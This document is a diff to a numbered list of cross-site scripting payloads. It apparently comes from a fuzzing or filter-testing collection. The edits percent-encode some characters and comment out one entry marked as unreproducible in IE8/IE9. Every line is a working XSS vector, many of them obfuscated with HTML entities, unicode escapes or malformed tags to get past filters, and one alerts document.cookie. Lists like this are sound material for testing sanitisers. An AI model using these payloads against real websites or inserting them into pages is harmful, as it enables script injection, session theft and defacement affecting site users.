@@ -36,7 +36,7 @@
 32) <script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
 33) <iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
 34) <a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
-35) <script ~~~>alert(0%0)</script ~~~>
+35) <script ~~~>alert(0%250)</script ~~~>
 36) <style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
 37) <///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
 38) <img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
@@ -54,14 +54,14 @@
 50) </svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
 51) <a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
 52) <div onmouseover='alert&lpar;1&rpar;'>DIV</div>
-53) <iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+53) <iframe style="position:absolute;top:0;left:0;width:100%25;height:100%25" onmouseover="prompt(1)">
 54) <a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
 55) <embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
 56) <object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
 57) <var onmouseover="prompt(1)">On Mouse Over</var>
 58) <a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
 59) <img src="/" =_=" title="onerror='prompt(1)'">
-60) <%<!--'%><script>alert(1);</script -->
+60) <%25<!--'%25><script>alert(1);</script -->
 61) <script src="data:text/javascript,alert(1)"></script>
 62) <iframe/src \/\/onload = prompt(1)
 63) <iframe/onreadystatechange=alert(1)
@@ -93,9 +93,10 @@
 89) <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
 90) <script x> alert(1) </script 1=2
 91) <div/onmouseover='alert(1)'> style="x:">
-92)  <--`<img/src=` onerror=alert(1)> --!>
+# unable to reproduce in IE8 or IE9
+#92)  <--`<img/src=` onerror=alert(1)> --!>
 93) <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
-94) <div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
+94) <div style="position:absolute;top:0;left:0;width:100%25;height:100%25" onmouseover="prompt(1)" onclick="alert(1)">x</button>
 95) "><img src=x onerror=window.open('https://www.google.com/');>
 96) <form><button formaction=javascript&colon;alert(1)>CLICKME
 97) <math><a xlink:href="//jsfiddle.net/t846h/">click
